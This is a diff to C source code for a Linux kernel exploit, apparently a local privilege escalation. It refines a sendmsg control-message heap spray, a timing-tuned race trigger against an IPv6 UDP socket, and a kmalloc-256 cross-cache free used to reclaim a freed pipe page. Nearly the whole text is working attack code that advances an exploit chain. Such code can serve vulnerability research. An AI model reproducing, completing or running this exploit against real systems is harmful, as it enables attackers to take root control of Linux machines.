@@ -161,31 +161,31 @@ u8 payload[SPRAY_SIZE] = { 0 };
 
 int control_socket[2] = { 0 };
 int spray_sockets[NUM_SPRAY][2] = { 0 };
+atomic_int spray_count = 0;
 
 
 void *spray_thread(void *x) {
     size_t index = (size_t)x;
-    write(control_socket[0], dummy_buf, 1);
-    read(control_socket[0], dummy_buf, 1);
     pin_to_cpu(0);
 
-    struct iovec iov = {
-        .iov_base = dummy_buf,
-        .iov_len = sizeof(dummy_buf),
-    };
-
-    struct msghdr msg = {
-        .msg_iov = &iov,
-        .msg_iovlen = 1,
-        .msg_control = payload,
-        .msg_controllen = sizeof(payload),
-    };
-
-    sendmsg(spray_sockets[index][1], &msg, 0);
-
-    // we only spray once for now, and never exit
     for (;;) {
-        sleep(1000);
+        write(control_socket[0], dummy_buf, 1);
+        read(control_socket[0], dummy_buf, 1);
+
+        struct iovec iov = {
+            .iov_base = dummy_buf,
+            .iov_len = sizeof(dummy_buf),
+        };
+
+        struct msghdr msg = {
+            .msg_iov = &iov,
+            .msg_iovlen = 1,
+            .msg_control = payload,
+            .msg_controllen = sizeof(payload),
+        };
+
+        atomic_fetch_add(&spray_count, 1);
+        sendmsg(spray_sockets[index][1], &msg, 0);
     }
 
     return NULL;
@@ -211,6 +211,8 @@ void setup_spray() {
         write(spray_sockets[i][1], dummy_buf, sizeof(dummy_buf));
     }
 
+    atomic_store(&spray_count, 0);
+
     pthread_t tid = 0;
     for (usize i = 0; i < NUM_SPRAY; i++) {
         pthread_create(&tid, 0, spray_thread, (void *)i);
@@ -226,22 +228,38 @@ void setup_spray() {
 
 void do_spray() {
     write(control_socket[1], dummy_buf, NUM_SPRAY);
+
     // wait for spray to finish
-    // cant really use barrier cause threads will indefinately block in sendmsg
-    // so they can't signal after they are done
+    // atomic at least indicates all threads run, but not necessarily all sendmsg called
+    // extra sleep is good safeguard that makes it very likely all messages sent
+    while (atomic_load(&spray_count) != NUM_SPRAY) {}
     sleep(1);
 }
 
-// cleans up resrouces used during spray
+// fees sprayed heap items
+void free_spray() {
+    // drain all sprayed messages
+    for (usize i = 0; i < NUM_SPRAY; i++) {
+        SYSCHK(read(spray_sockets[i][0], dummy_buf, sizeof(dummy_buf)));
+    }
+}
+
+// resets spray threads back to initial state after setup spray
 void reset_spray() {
     for (usize i = 0; i < NUM_SPRAY; i++) {
-        read(spray_sockets[i][0], dummy_buf, sizeof(dummy_buf));
-        // SYSCHK(close(spray_sockets[i][0]));
-        // SYSCHK(close(spray_sockets[i][1]));
+        // drain remaining cmsg message
+        SYSCHK(read(spray_sockets[i][0], dummy_buf, sizeof(dummy_buf)));
+        // write back first message
+        write(spray_sockets[i][1], dummy_buf, sizeof(dummy_buf));
     }
 
-    // SYSCHK(close(control_socket[0]));
-    // SYSCHK(close(control_socket[1]));
+    // wait for threads to get setup
+    int to_read = NUM_SPRAY;
+    while (to_read > 0) {
+        to_read -= read(control_socket[1], dummy_buf, NUM_SPRAY);
+    }
+
+    atomic_store(&spray_count, 0);
 }
 
 int open_connected_ipv6_udp_socket() {
@@ -501,13 +519,16 @@ void *run_trigger_thread(void *arg) {
 
         int one = 1;
         // don't check result, socket might be closed
-        setsockopt(socket_fd, SOL_IPV6, SO_CNX_ADVICE, &one, sizeof(one));
+        setsockopt(socket_fd, SOL_SOCKET, SO_CNX_ADVICE, &one, sizeof(one));
     }
 }
 
 void try_run_main_exploit(TriggerCtx *ctx);
 
 void trigger_vuln_loop() {
+    // setup spray threads before anything else
+    setup_spray();
+
     pthread_t cpu1_block_thread = { 0 };
     pthread_t trigger_thread = { 0 };
 
@@ -519,7 +540,7 @@ void trigger_vuln_loop() {
         .post_sockets = { 0 },
         .trigger_thread = 0,
         .sync_pipe_to_trigger = open_pipe(),
-        .timer_offset = 240000,
+        .timer_offset = 20000,
     };
 
     // this thread will spin on cpu1 forever
@@ -544,11 +565,11 @@ void trigger_vuln_loop() {
         // adjust timerfd timing based on previous runs
         if (iteration_count == 5) {
             if (too_long_count == 5) {
-                ctx.timer_offset -= 2000;
+                ctx.timer_offset -= 23;
                 LOG("\nDecrease time window to: %lu\n", ctx.timer_offset);
             } else if (too_long_count == 0) {
                 // being too short is much more expensive
-                ctx.timer_offset += 20000;
+                ctx.timer_offset += 15013;
                 LOG("\nIncrease time window to: %lu\n", ctx.timer_offset);
             }
             // if there was a mix of too long and too short, we will eventually hit the race probably
@@ -600,6 +621,9 @@ void trigger_vuln_loop() {
         open_many_sockets(ctx.pre_sockets, NUM_PRE_SOCKETS);
         ctx.vuln_socket = open_connected_ipv6_udp_socket();
         open_many_sockets(ctx.post_sockets, NUM_POST_SOCKETS);
+
+        // also prepare spray again
+        reset_spray();
     }
 }
 
@@ -608,9 +632,7 @@ void try_run_main_exploit(TriggerCtx *ctx) {
     Pipe page_pipes[NUM_PAGE_PIPES] = { 0 };
     Pipe vuln_pipes[NUM_VULN_PIPES] = { 0 };
 
-    LOG("setup spray and open pipes...");
-    setup_spray();
-
+    LOG("open pipes...");
     // setup page pipes to have 1 pipe buffer entry with 1 backing page, but don't prefault
     for (usize i = 0; i < NUM_PAGE_PIPES; i++) {
         page_pipes[i] = open_pipe();
@@ -654,7 +676,7 @@ void try_run_main_exploit(TriggerCtx *ctx) {
     // trigger all sprayed objects to be freed
     // will trigger a page with vuln pipe to be freed
     LOG("kmalloc-256 cross cache free...");
-    reset_spray();
+    free_spray();
 
     // attempt to reclaim vuln pipe with another pipe backing page
     LOG("reclaim with pipe buffer backing page...");
